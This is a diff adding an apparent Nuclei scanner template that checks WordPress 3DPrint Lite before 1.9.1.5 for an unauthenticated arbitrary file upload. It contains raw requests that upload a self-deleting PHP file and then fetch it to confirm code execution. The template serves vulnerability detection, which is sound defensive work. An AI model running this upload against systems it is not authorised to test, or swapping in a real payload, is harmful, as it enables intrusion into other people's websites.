@@ -1,0 +1,52 @@
+id: 3dprint-arbitrary-file-upload
+
+info:
+  name: WordPress 3DPrint Lite <1.9.1.5 - Arbitrary File Upload
+  author: SecTheBit
+  severity: high
+  description: |
+    WordPress 3DPrint Lite plugin before 1.9.1.5 contains an arbitrary file upload vulnerability. The p3dlite_handle_upload AJAX action of the plugin does not have any authorization and does not check the uploaded file. An attacker can upload arbitrary files to the server, which in turn can be used to make the application execute file content as code, As a result, an attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized operations.
+  remediation: Upgrade to 1.9.1.5 or later.
+  reference:
+    - https://wpscan.com/vulnerability/c46ecd0d-a132-4ad6-b936-8acde3a09282
+    - https://www.exploit-db.com/exploits/50321
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 8.8
+    cwe-id: CWE-434
+  metadata:
+    verified: true
+    max-request: 2
+  tags: wpscan,edb,wordpress,wp,wp-plugin,fileupload,intrusive,3dprint,vuln
+
+variables:
+  string: "3dprint-arbitrary-file-upload"
+
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Content-Type: multipart/form-data; boundary=---------------------------54331109111293931601238262353
+
+        -----------------------------54331109111293931601238262353
+        Content-Disposition: form-data; name="action"
+
+        p3dlite_handle_upload
+        -----------------------------54331109111293931601238262353
+        Content-Disposition: form-data; name="file"; filename={{randstr}}.php
+        Content-Type: text/php
+
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
+        -----------------------------54331109111293931601238262353--
+      - |
+        GET /wp-content/uploads/p3d/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 490a0046304402200dd1de57a608841bd8482c167444d8369e0639f5021a11e7303e04595b0ba37702207ce7bd3b7dc8b3cb5e7fa0cdd1187872ec06f133bc19d2e8b68550a38d634f16:922c64590222798bb761d5b6d8e72950
